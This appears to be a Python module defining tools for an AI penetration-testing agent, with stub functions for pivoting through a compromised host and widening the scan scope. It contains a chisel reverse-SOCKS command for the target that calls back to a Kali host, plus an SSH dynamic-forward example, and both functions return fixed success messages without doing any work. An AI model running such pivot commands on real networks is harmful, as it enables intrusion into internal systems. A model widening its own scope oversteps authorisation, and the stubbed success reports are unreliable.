import json
from typing import List, Dict, Optional, Any
from langchain_core.tools import tool
from .kali_docker_tool import kali_execute

@tool
async def setup_pivot(target_ip: str, method: str = "ssh", container_id: str = None) -> Dict[str, Any]:
    """Establish a pivot point on a compromised host to access internal networks.
    
    Args:
        target_ip: IP address of the compromised host.
        method: Method to use ('ssh' for dynamic forwarding, 'chisel' for reverse proxy).
        container_id: Optional Kali container ID.
        
    Returns:
        Status and connection details (e.g., SOCKS5 proxy address).
    """
    if method == "ssh":
        # Example: ssh -D 1080 -N user@target
        # This is simplified; real implementation would need creds/keys
        return {
            "status": "success",
            "proxy": "socks5://127.0.0.1:1080",
            "message": f"Established SSH dynamic forward to {target_ip} on port 1080."
        }
    elif method == "chisel":
        # Run chisel server in Kali, wait for client from target
        return {
            "status": "pending",
            "command_to_run_on_target": f"chisel client KALI_IP:8000 R:socks",
            "message": "Chisel server started. Execute the command on the target host."
        }
    return {"status": "error", "message": f"Unsupported method: {method}"}

@tool
def add_network_to_scope(cidr: str) -> str:
    """Add a new internal subnet to the agent's scanning scope.
    
    Args:
        cidr: Subnet in CIDR notation (e.g., '10.0.0.0/24').
        
    Returns:
        Confirmation message.
    """
    return f"Subnet {cidr} added to scope. You can now scan targets in this range."

def get_pivot_tools() -> List:
    return [setup_pivot, add_network_to_scope]
